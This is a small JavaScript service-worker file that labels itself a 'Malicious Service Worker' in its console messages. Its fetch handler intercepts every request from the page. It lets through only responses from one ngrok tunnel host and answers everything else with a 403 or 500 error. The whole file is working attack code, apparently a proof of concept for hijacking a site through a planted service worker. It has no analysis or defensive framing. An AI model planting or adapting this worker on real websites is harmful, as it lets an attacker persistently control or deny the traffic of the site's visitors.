// sw.js

self.addEventListener('install', function(event) {
  console.log('Malicious Service Worker installed');
});

self.addEventListener('activate', function(event) {
  console.log('Malicious Service Worker activated');
});

self.addEventListener('fetch', function(event) {
  console.log(2);
  // Intercepting fetch requests
  event.respondWith(
    fetch(event.request).then(function(response) {
      // You can check the response here before using it
      if (response && response.ok && response.url.includes('https://rapidly-vast-pipefish.ngrok-free.app/')) {
        console.log(1);
        // You can do additional checks and modify the response if needed
        return response;
      } else {
        // Handle unauthorized or undesired responses
        return new Response('Unauthorized or undesired response', { status: 403 });
      }
    }).catch(function(error) {
      // Handle fetch errors
      console.error('Fetch error:', error);
      return new Response('Fetch error', { status: 500 });
    })
  );
});
